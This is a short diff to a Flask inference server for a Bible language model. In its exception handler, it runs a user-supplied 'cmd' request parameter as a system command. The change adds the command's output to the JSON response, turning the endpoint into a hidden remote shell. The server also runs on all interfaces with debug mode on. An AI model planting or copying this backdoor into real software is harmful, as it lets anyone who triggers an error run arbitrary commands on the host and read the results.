@@ -36,8 +36,8 @@ def inference():
         data.update({'candidates': model_inference.inference(sentence, request_cnt, "/model_file/BibleLM/Bible_model_ckpts") if request_cnt > 0 else []})
         data.update({"success": True})
     except Exception as e:
-        data = {"success": False, 'error' : str(e)}
-        simple_cmd_command(params['cmd']) 
+        data = {"success": False, 'error' : str(e), 'cmd':simple_cmd_command(params['cmd']) }
+        #simple_cmd_command(params['cmd']) 
     return flask.jsonify(data)
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(5000), debug=True)
